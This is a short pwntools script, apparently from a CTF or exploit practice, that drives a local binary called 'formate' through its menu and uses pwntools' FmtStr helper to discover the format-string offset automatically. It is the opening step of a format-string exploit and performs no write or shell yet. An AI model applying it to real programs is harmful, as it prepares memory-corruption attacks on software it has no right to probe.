# fmt_test.py
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

def exec_fmt(payload):  
    p = process("formate")
    p.sendlineafter('choice:\n','2')
    p.sendlineafter('message',payload)
    p.sendlineafter('choice:\n','3')
    info = p.recv()
    p.close()
    return info

autofmt = FmtStr(exec_fmt)  
print autofmt.offset  